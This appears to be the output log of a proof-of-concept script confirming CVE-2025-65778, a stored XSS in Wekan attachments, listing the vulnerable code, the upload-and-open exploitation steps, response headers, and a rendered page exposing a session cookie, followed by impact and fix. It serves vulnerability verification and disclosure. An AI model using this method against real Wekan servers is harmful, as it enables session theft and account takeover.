======================================================================
CVE-2025-65778 - Wekan Attachment Content-Type XSS
======================================================================

[*] Checking if Wekan service is running...
[+] Wekan service is running at http://localhost:8080

[*] Source Code Analysis:
--------------------------------------------------
[+] Found 2 vulnerable code patterns:
    [1] server/routes/legacyAttachments.js
        Issue: Content-Type set from user-supplied attachment.type
        Evidence: res.setHeader('Content-Type', attachment.type || 'application/octet-stream')
    [2] models/attachments.js
        Issue: text/html MIME type not blocked in onBeforeUpload
        Evidence: Only SVG files blocked, text/html allowed

[*] Exploitation Steps:
--------------------------------------------------
1. Login to Wekan as admin@example.com
2. Created board "TestBoard" and card "TestCard"
3. Uploaded HTML file with XSS payload (xss_poc.html)
4. Accessed attachment URL directly

[*] Attachment URL:
http://localhost:8080/cdn/storage/attachments/69811c3cba430e75ca1575d9/original/69811c3cba430e75ca1575d9.html

[*] Server Response Headers:
--------------------------------------------------
HTTP/1.1 200 OK
Content-Disposition: inline; filename="xss_poc.html"; filename*=UTF-8''xss_poc.html; charset=UTF-8
Cache-Control: public, max-age=31536000, s-maxage=31536000
Content-Type: text/html
Accept-Ranges: bytes
Content-Length: 228

[*] Browser Rendered Content:
--------------------------------------------------
Page Title: XSS
Page Content:
- heading "XSS-CVE-2025-65778" [level=1]
- heading "XSS Executed! Cookie: x_mtok=cznASbPPsh4To22Fb" [level=2]

======================================================================
[+] VULNERABILITY CONFIRMED - XSS EXPLOITATION SUCCESSFUL
======================================================================

Verification Evidence:
1. HTML file uploaded as card attachment with text/html MIME type
2. Server returned Content-Type: text/html (attacker-controlled)
3. JavaScript in uploaded HTML executed in application's origin
4. document.cookie successfully accessed (session token exposed)

This confirms CVE-2025-65778:
- Uploaded attachments served with attacker-controlled Content-Type
- Allows execution of attacker-supplied HTML/JS
- Enables session/token theft and CSRF actions

Impact: HIGH
- Session hijacking via cookie theft
- Cross-Site Request Forgery (CSRF)
- Account takeover

Fix: Upgrade to Wekan v8.16 which sanitizes Content-Type headers
